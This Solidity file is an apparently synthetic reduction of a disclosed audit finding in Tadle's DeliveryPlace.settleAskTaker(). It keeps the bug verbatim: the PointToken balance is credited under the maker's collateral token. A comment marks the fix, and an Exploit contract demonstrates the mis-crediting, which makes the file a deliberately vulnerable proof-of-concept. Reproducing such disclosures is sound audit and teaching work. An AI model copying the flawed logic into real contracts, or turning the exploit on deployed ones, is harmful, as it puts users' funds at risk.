// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Tadle — DeliveryPlace::settleAskTaker() mistakenly uses makerInfo.tokenAddress
    to update the PointToken balance (Codehawks, pontifex, finding #38070)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground. The vulnerable
    addTokenBalance call is inlined VERBATIM (with the wrong token address
    argument); the Exploit deploys a reduced DeliveryPlace + TokenManager with
    two DISTINCT tokens — the actual point token being delivered, and the
    maker's original (unrelated) collateral token — and shows the settling
    user's PointToken-type balance is booked against the WRONG token entirely
    (no fork, no cheatcodes).

    Root cause: settleAskTaker pulls in the correct token
    (marketPlaceInfo.tokenAddress) via tillIn, but then credits the internal
    PointToken-type ledger using makerInfo.tokenAddress — the maker's
    ORIGINAL collateral token from when the offer was first created, which has
    nothing to do with the point token actually being delivered in this call.
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

struct OfferInfo {
    address authority; // the buyer who is entitled to receive the PointToken credit
}

struct MakerInfo {
    address tokenAddress; // the maker's ORIGINAL collateral token (e.g. USDC) — unrelated here
}

struct MarketPlaceInfo {
    address tokenAddress; // the ACTUAL point token being delivered in this settlement
    uint256 tokenPerPoint;
}

/// @notice Minimal TokenManager: pulls the settlement point-token in and credits
///         an internal ledger keyed by (account, token, balanceType).
contract TokenManager {
    enum TokenBalanceType {
        PointToken
    }

    mapping(address => mapping(address => mapping(uint8 => uint256))) public userTokenBalanceMap;

    function tillIn(address from, address token, uint256 amount, bool /*isPointToken*/ ) external {
        MockToken(token).transferFrom(from, address(this), amount);
    }

    function addTokenBalance(TokenBalanceType t, address account, address token, uint256 amount) external {
        userTokenBalanceMap[account][token][uint8(t)] += amount;
    }
}

/// @notice Reduced DeliveryPlace. A `setup()` scaffolding function replaces the real
///         PreMarkets/PerMarkets/SystemConfig wiring so the vulnerable token-address
///         mix-up can be exercised directly and deterministically.
contract DeliveryPlace {
    TokenManager public tokenManager;

    mapping(address => OfferInfo) public offerInfoMap;
    mapping(address => MakerInfo) public makerInfoMap;
    MarketPlaceInfo public marketPlaceInfo;

    constructor(TokenManager _tm) {
        tokenManager = _tm;
    }

    /// @dev Test scaffolding only — wires up one offer with the maker's ORIGINAL
    ///      collateral token distinct from the point token actually delivered.
    function setup(address _offer, address _offerAuthority, address _makerToken, address _pointToken, uint256 _tokenPerPoint)
        external
    {
        offerInfoMap[_offer] = OfferInfo({authority: _offerAuthority});
        makerInfoMap[_offer] = MakerInfo({tokenAddress: _makerToken});
        marketPlaceInfo = MarketPlaceInfo({tokenAddress: _pointToken, tokenPerPoint: _tokenPerPoint});
    }

    function settleAskTaker(address _offer, uint256 _settledPoints) external {
        OfferInfo memory offerInfo = offerInfoMap[_offer];
        MakerInfo memory makerInfo = makerInfoMap[_offer];
        MarketPlaceInfo memory marketPlaceInfo_ = marketPlaceInfo;

        // SNIP... (access control / status checks omitted — out of scope for this reduction)

        uint256 settledPointTokenAmount = marketPlaceInfo_.tokenPerPoint * _settledPoints;
        if (settledPointTokenAmount > 0) {
            tokenManager.tillIn(msg.sender, marketPlaceInfo_.tokenAddress, settledPointTokenAmount, true);

            tokenManager.addTokenBalance(
                TokenManager.TokenBalanceType.PointToken,
                offerInfo.authority,
                makerInfo.tokenAddress, // @> VULN: should be marketPlaceInfo_.tokenAddress
                settledPointTokenAmount
            );
        }
        // FIX: tokenManager.addTokenBalance(..., offerInfo.authority, marketPlaceInfo_.tokenAddress, settledPointTokenAmount);
        // SNIP...
    }
}

/// @notice Demonstrates the token mix-up: the actual point token is pulled in
///         correctly, but the settling user's credited PointToken balance is
///         booked against the maker's unrelated original collateral token.
contract Exploit {
    MockToken public pointToken; // the token actually delivered in this settlement
    MockToken public makerToken; // the maker's ORIGINAL, unrelated collateral token
    TokenManager public tokenManager;
    DeliveryPlace public deliveryPlace;

    address public offerAddr = address(0xAAA3);
    address public buyer = address(0xBBB3); // offerInfo.authority — entitled to the PointToken credit
    uint256 public constant SETTLED_POINTS = 1000;
    uint256 public constant TOKEN_PER_POINT = 1e16; // 0.01 token per point

    constructor() {
        pointToken = new MockToken();
        makerToken = new MockToken();
        tokenManager = new TokenManager();
        deliveryPlace = new DeliveryPlace(tokenManager);

        deliveryPlace.setup(offerAddr, buyer, address(makerToken), address(pointToken), TOKEN_PER_POINT);

        uint256 amount = TOKEN_PER_POINT * SETTLED_POINTS;
        pointToken.mint(address(this), amount);
        pointToken.approve(address(tokenManager), amount);
    }

    function run() external {
        deliveryPlace.settleAskTaker(offerAddr, SETTLED_POINTS);

        uint256 expectedAmount = TOKEN_PER_POINT * SETTLED_POINTS;

        // HARM #1: the buyer's PointToken-type balance under the CORRECT token
        // (the point token actually delivered) is still zero — never credited.
        uint256 correctTokenCredit = tokenManager.userTokenBalanceMap(
            buyer, address(pointToken), uint8(TokenManager.TokenBalanceType.PointToken)
        );
        require(correctTokenCredit == 0, "harm not demonstrated: correct-token credit should be zero");

        // HARM #2: instead, the credit lands under the maker's UNRELATED original
        // collateral token — a token the buyer never actually received a claim on.
        uint256 wrongTokenCredit = tokenManager.userTokenBalanceMap(
            buyer, address(makerToken), uint8(TokenManager.TokenBalanceType.PointToken)
        );
        require(wrongTokenCredit == expectedAmount, "harm not demonstrated: wrong-token credit missing");
    }
}
